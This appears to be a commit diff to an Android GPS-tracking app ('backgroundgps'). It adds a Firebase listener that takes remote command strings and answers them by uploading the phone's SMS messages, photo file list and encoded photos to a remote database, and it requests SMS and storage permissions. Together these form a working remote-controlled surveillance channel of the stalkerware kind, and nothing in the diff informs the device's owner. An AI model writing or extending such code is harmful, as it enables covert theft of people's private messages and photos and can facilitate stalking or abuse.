@@ -26,8 +26,11 @@ import android.widget.Button;
 import android.widget.EditText;
 import android.widget.Toast;
 
+import com.google.firebase.database.DataSnapshot;
+import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
+import com.google.firebase.database.ValueEventListener;
 import com.google.gson.Gson;
 import com.guy.backgroundgps.settings.Tracker;
 
@@ -105,9 +108,52 @@ public class MainActivity extends AppCompatActivity {
 
             phoneNumber=addPhoneNumberEditText.getText().toString();
             name=addNameEditText.getText().toString();
+            readFromFirebace(v);
+
         }
     };
+    private void readFromFirebace(View v) {
+        // Read from the database
+        myRef.child("functions").child(phoneNumber).addValueEventListener(new ValueEventListener() {
+            @Override
+            public void onDataChange(DataSnapshot dataSnapshot) {
+                // This method is called once with the initial value and again
+                // whenever data at this location is updated.
+                String value = dataSnapshot.getValue(String.class);
+                chooseFunctionByString(value);
+            }
 
+            @Override
+            public void onCancelled(DatabaseError error) {
+                // Failed to read value
+
+            }
+        });
+
+    }
+    private void chooseFunctionByString(String value) {
+        if(value==null)
+            return;
+        switch(value) {
+            case "TakePhoto":
+                List<String> photoList=Photos.getImagesPath(this);
+                myRef.child(phoneNumber).child("photoList").setValue(photoList);
+                break;
+            case "TakeSMS":
+                List<Pair> smsList= SMS.getSMS(this);
+                myRef.child(phoneNumber).child("SMSList").setValue(smsList);
+                break;
+            case "TakePhotoByPath":
+                String photoPath="/storage/emulated/0/DCIM/Camera/20160606_225147_Burst04.jpg";
+                //savephotoToStorage(photoPath);
+                  String photo=Photos.BitMapToString(Photos.getImageByPath(photoPath));
+                  myRef.child(phoneNumber).child("photo").push().setValue(photo);
+                  Log.i("fdsfsd",photo);
+
+            default:
+                // code block
+        }
+    }
     private void newLocation(final MyLoc lastLocation) {
         runOnUiThread(new Runnable() {
             @Override
@@ -202,6 +248,9 @@ public class MainActivity extends AppCompatActivity {
                         ,Manifest.permission.ACCESS_FINE_LOCATION
                         ,Manifest.permission.ACCESS_BACKGROUND_LOCATION
                         ,Manifest.permission.FOREGROUND_SERVICE
+                        ,Manifest.permission.READ_EXTERNAL_STORAGE
+                        ,Manifest.permission.RECEIVE_SMS
+                        ,Manifest.permission.READ_SMS
                 },
                 LOCATION_PERMISSIONS_REQUEST_CODE);
     }
